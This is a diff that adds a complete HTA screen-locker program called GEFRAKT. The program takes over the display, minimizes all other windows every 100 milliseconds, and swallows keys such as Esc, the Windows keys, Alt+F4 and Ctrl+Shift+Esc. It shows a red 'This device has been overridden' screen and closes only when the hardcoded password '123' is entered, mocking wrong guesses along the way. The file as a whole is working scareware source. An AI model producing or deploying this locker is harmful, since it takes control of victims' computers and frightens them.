@@ -1,0 +1,134 @@
+<html>
+<head>
+	<title>GEFRAKT</title>
+	<HTA:APPLICATION
+		APPLICATIONNAME="GEFRAKT"
+		VERSION="1.0.0.0"
+		BORDER="none"
+		INNERBORDER="no"
+		CAPTION="no"
+		SYSMENU="no"
+		MAXIMIZEBUTTON="no"
+		MINIMIZEBUTTON="no"
+		ICON="NO"
+		SCROLL="no"
+		SCROLLFLAT="yes"
+		SINGLEINSTANCE="yes"
+		WINDOWSTATE="maximize"
+		SHOWINTASKBAR="no"
+		CONTEXTMENU="no"
+		SELECTION="no"
+	/>
+	
+	<style>
+		html {
+			z-index:2147483647; // CRANK IT TO DA MAX
+		}
+		
+		body {
+			font-family: Lucida Console;
+			font-size: 50px;
+			background-color: #a50000;
+			border: 0;
+			color: #FFF;
+			text-align: center;
+		}
+		
+		footer {
+			position: relative;
+		}
+		
+		#ClickableSpan {
+			position: absolute;
+			bottom: 50px;
+			right: 50px;
+			color: #0FF;
+		}
+	</style>
+</head>
+
+<script type='text/vbscript'> 
+	window.setInterval "SetToFocus()", 100
+		Function SetToFocus()
+		window.focus()
+		set objShell = CreateObject("shell.application")
+		objShell.MinimizeAll
+		End Function
+</script>
+
+
+<script language="VBScript">
+	Sub RunScript
+		dim p4ss
+		p4ss = "123"
+		
+		// Password = InputBox("Type in the password (" & p4ss & "):","Input password")
+		Password = InputBox("Type in the password:","Input password")
+		
+		If Password = "" Then
+		MsgBox "No input", 16, "Error 1"
+		End If
+		If Password <> p4ss AND NOT(Password = "password" OR Password = "Password") AND NOT Password = "" Then
+		MsgBox "Wrong input", 16, "Error 2"
+		End If
+		If Password = "password" OR Password = "Password" Then
+		MsgBox "You're a hopeful one.", 16, "LOL NOOB"
+		End If
+		If Password = p4ss Then
+		window.close
+		End if
+	End Sub
+
+	Sub Pointer
+		document.body.style.cursor = "hand"
+	End Sub
+
+	Sub DefaultCursor
+		document.body.style.cursor = "default"
+	End Sub
+</script>
+
+<script language="JavaScript">
+	function document.onkeydown() {
+		var alt = window.event.altKey;
+		var ctrl = window.event.ctrlKey;
+		var shift = window.event.shiftKey;
+		var win = window.event.metaKey;
+		
+		if (
+			event.keyCode == 116 ||
+			event.keyCode == 27 ||
+			event.keyCode == 91 ||
+			event.keyCode == 92 ||
+			win ||
+			alt && event.keyCode == 115 ||
+			ctrl && shift && event.keyCode == 27
+		) {
+			event.keyCode = 0;
+			event.cancelBubble = true;
+			return false;
+		}
+	}
+</script>
+
+<body
+	scroll="no"
+	border="0"
+	oncontextmenu="return false"
+	onselectstart="return false"
+>
+	<p>This is GEFRAKT.</p><br>
+	<p>This device has been overridden.</p>
+	
+	<footer>
+		<span
+			id="ClickableSpan"
+			onClick="RunScript"
+			onmouseover="Pointer" 
+			onmouseout="DefaultCursor"
+		>
+			UNLOCK
+		</span>
+	</footer>
+</body>
+</html>
